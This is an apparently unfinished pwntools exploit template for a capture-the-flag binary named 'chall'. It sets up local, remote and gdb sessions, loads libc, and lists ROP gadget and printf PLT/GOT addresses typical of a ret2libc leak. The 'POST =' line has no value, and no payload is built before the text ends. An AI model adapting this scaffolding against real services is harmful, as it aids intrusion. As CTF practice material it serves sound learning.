from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = ''
POST = 
libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b main''')
ret = 0x004011ec
prdi = 0x0040115a
printf_plt = 0x401030
printf_got = 0x403fd0
gets_main_add = 0x40117b
